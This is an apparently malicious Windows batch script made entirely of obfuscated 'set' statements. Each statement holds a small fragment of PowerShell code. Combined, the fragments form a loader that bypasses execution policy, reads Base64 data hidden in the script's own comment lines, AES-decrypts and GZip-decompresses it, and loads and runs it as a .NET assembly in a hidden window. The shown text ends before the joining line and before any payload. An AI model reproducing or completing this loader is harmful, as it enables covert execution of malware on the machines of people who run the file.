@echo off
set "WteryrguwT=.Cop"
set "vCOOCqBdPh===')"
set "nfMdLSvQkg=-joi"
set "wplMYySToi=ptog"
set "axpXnypayU=comp"
set "PkYbyIbfAJ=rffC"
set "GfrJYwYhCO='oPV"
set "QnVLWkcKEa=t Sy"
set "llgeZKMKKM=IONw"
set "amXGBbWDdF= [Sy"
set "YWkMtuSiwN=$JXQ"
set "jDolIssqew=('%*'"
set "BIKRvClcfq=i = "
set "LrgQLjycgO=; };"
set "WXqYBATgai=Fina"
set "OCrEEOHKJl=pS, "
set "whFPwWAKLo=ck($"
set "gIprnCGbQa=Bmor"
set "uFCTLoSdlu=ewLi"
set "YqHtCKBVvM=:: '"
set "ZYmNvaBkzj=esMa"
set "tbVafuUUrB=7kGw"
set "uBTCXYGLmE= [st"
set "DFxbSytVEy=pose"
set "ddMThPWurx=m.IO"
set "mTVkERsuAj=ddin"
set "BotBkuzYls=sion"
set "eORMaAjjbZ=::De"
set "VuQQtdcSkI=mory"
set "YIBXFMlmLd=);$u"
set "ApXSQpconl=iron"
set "vPiIBuhYtl=).Sp"
set "JrptlQqgZi=hy.A"
set "fcdEcUdGGm=('da"
set "ZQVtbpIYJb=ionM"
set "OOpnXWXtrC='')("
set "YjXSSzNkBK=-1.."
set "eiNdqgaDjZ=Syst"
set "jVjRgCAkml=oin "
set "TdpjIoiHdA=lBlo"
set "OHoIcRxYIV=);$J"
set "byhtbHHMaS=ki ="
set "UFdIHhPRbZ=New-"
set "CbNyOQcMDT=Secu"
set "TBGERGMXzA=ach "
set "MJwXZKlVpT=-Obj"
set "FoBMkHKLjn=6esa"
set "PdDVbxXtsZ=raph"
set "DjbLojsHUY= = ["
set "KDvRqfzwim=ion."
set "LizBckvlmG=and "
set "jcgPSMmagx=$ION"
set "GNWjHzFQZd=-4] "
set "BZLNdoVZLH=jb ="
set "iGQasDmcxk=ddin"
set "ddJEEXGNRr=y.Ci"
set "fwBCzHUlTS=]::("
set "PEEDectyug= = N"
set "oGYrUPYnyi=tem."
set "BJubXrMtqZ=embl"
set "pvXseRPhOz=[Sys"
set "XqERAUuhaz= New"
set "IOXRKcajfC=rofi"
set "dELyVltzHA=$xpc"
set "ewccCIqVFg=m.Re"
set "kMQLFRYQBm=($Ev"
set "vXHhzbmfmx=o.En"
set "SecXbLLVEU=BC;$"
set "RIJjyhizNp=Disp"
set "iEBKZtGGib=]::C"
set "kcldVcNEzT=yste"
set "GHHnQNWXCU=.Com"
set "TlrVQkEOLU=d;$J"
set "ERRxwlmhIm=.-16"
set "rpAeSBbxbH=form"
set "knKoOZqiNN=OQy "
set "hotIOXYZqk=ect "
set "UuSoqbcegS=XQYn"
set "ByWrXhmlVh=.Len"
set "LRVsyQqZXk=S = "
set "ixhnWOXwZO=ptor"
set "IWUBaalNZo=Obje"
set "KrDeAauuEF=yste"
set "RlSEXdFjCe='[-1"
set "oOMiLzHgxU=Svki"
set "fzWKaXpqQJ=pcbs"
set "AJvTTFAboX=.Sec"
set "rxSbArofdw=eam("
set "gIGEMrJVNm=Syst"
set "IvjhNFoIYB=rt]:"
set "AkrtwEdaJe=comm"
set "ciyaZUujbD=se()"
set "EDaJvTculh=.Mem"
set "FoqgOZeUcc=.Cry"
set "jMtgGYVtbK==');"
set "nJqQJrtQaZ=oryS"
set "jxoaWtRHYI=l.Su"
set "hSeVGBvYTU=)($I"
set "XBQIhkZisB=);$x"
set "RRymaYPSew=16] "
set "moRkPcPbfG=ment"
set "aIxNRdEASJ=aDNK"
set "sVDLYePnTR=$uSv"
set "IsYYuzDJrO=[Sys"
set "qjZMpeEtsH=s = "
set "MjtmPrecgl=ress"
set "RDzuIDwyjP=ki);"
set "mIKsOqhKjJ=Gqfj"
set "xyerEVqmnO=..-1"
set "SFxXCIaJKm=tryP"
set "xtWgVWpWZs=ring"
set "uFoeiluDmy=ode]"
set "UnnzRYcPpy=] -j"
set "SLdPJxSbDy=('%~f0'"
set "tQhjlTUbbF=nirt"
set "PShmiPKjDj=yste"
set "TKpZkEMaJt=DNJS"
set "YRYpBqMjCe=k; }"
set "oXcwRDkTlS=2VUN"
set "YZjwstNVkP=$ION"
set "DmToyvWxHi=join"
set "djVIMLCsWt=gMod"
set "DSnMJSRAsr=raph"
set "DVZGPasUKt=bstr"
set "RmMeqiSAZD=.Cre"
set "nusQbzIPbT=1] -"
set "fhiHrruxze=Wyqo"
set "slhfLuVjxm=;$Re"
set "znshmemHLm=bypa"
set "DpVuToZrwE=i, 0"
set "eyMaKAioHz=rity"
set "bDYUxqkXwe=.Dis"
set "BhFuHQUmPf=Disp"
set "EEMNrneLGw=Star"
set "aJwJXdmcoF=)))"
set "FTfxczHHQd=yTo("
set "ItGVfwYgpL=rffC"
set "gSgshOnZbl=pher"
set "IdImmwvWCN=rans"
set "mIyvBIUXYv=b) {"
set "PeiNJbqBps=();$"
set "tmKGgBDIzh='gni"
set "EwMIOpDKeH=;$qB"
set "ajqZuYGjSY=ne);"
set "ykeMxkSJFt=qBLU"
set "cYvPAlzaHS=fore"
set "ZHXzdylKsJ=F'[-"
set "CKWXdCGcvy=kyhK"
set "yAmoiHggKq=oArr"
set "aMIwpgUpdE=ress"
set "lbOEQmJiMW=Qy.T"
set "mWUFqlNivD=Secu"
set "vMzFtraJqN=[Sys"
set "APbeJDRNnH=tS46"
set "wZEZLrqylg= if "
set "DFXUoNGqXl=e = "
set "kOmHXzWDpl=:('g"
set "bJAqXWGMBp== $J"
set "ZJycuZaLwS=tsWi"
set "EPVbJcxDlH=lit("
set "eeycPsbkuq=em.I"
set "BiYebcuLPy=ispo"
set "gTfzTkxJju=stem"
set "SJGriiiLyf=)($s"
set "cqNIkbZEhG=$Gqf"
set "fIEYKYAdGu=  $s"
set "NcMpIkrvGQ=.Key"
set "dDDFUihMDL=pose"
set "vMwhKJWVdC=O.Me"
set "RqCapiXqDW=daeR"
set "uuewVuaRxj=sCzy"
set "AItsvZxjUL=.Dis"
set "cTKeySHzBi=ing("
set "OSvsAyCLiO=in $"
set "pvAFGQsggi=File"
set "OfnYQLEiQt=.Cry"
set "utHySVelLC=n ''"
set "xeLXiGrRJE=-ep "
set "nHUaRGYHUf=.Mod"
set "EzSdDLxMxO=.IO."
set "wIIKYGiUjL=ay()"
set "wNwKjgPvez=8kuY"
set "KjdDpgiKqk=bjec"
set "TmSbuHuJnu=null"
set "CrldNzPOQI=;$Xs"
set "egNXpDrFvk=();$"
set "rlHIGwjMtz=Azl "
set "bfZDrqfuck=g = "
set "ZsqbfonUfc=ateD"
set "aoQWlXvAHI=]::N"
set "uORkqJnIJM=xpcb"
set "DsIxXtUxXo=zm83"
set "eXavpmfxrL=);$X"
set "hJspTLFCPA=y.Cr"
set "OhDZBZYGOC=saBm"
set "ESzhIOdkJQ=JXQY"
set "UJhkqUfmZi=urit"
set "vZtzDfhnHi=n ''"
set "CXtHdhkTvu=.GZi"
set "xwWqKdSyFY= = $"
set "zYGHOEXgam=THxh"
set "amjSiWESRt=R5jf"
set "beMOKVJsMi=FcNh"
set "UwHJVNkRzc=m.IO"
set "oYLjsuCAmd=$EVo"
set "fiyoafesgM=[IO."
set "xOsyLpXyUu=le  "
set "fkXOFtmlvt= '')"
set "onINZIApUp=($Ev"
set "dMdekbCdGG=.Con"
set "RNmifSNgjO=Czy."
set "PzqUUXBtWR=..-1"
set "KmHtMqkjqA=[-1."
set "zGIbwfVAWD=('ev"
set "uqBQMYbyPe=tem."
set "uvazRCJWYB=[]] "
set "LDtKcDJvnQ=EVop"
set "QlQqcBtUcP='txe"
set "pkuAkJLrxK=Comp"
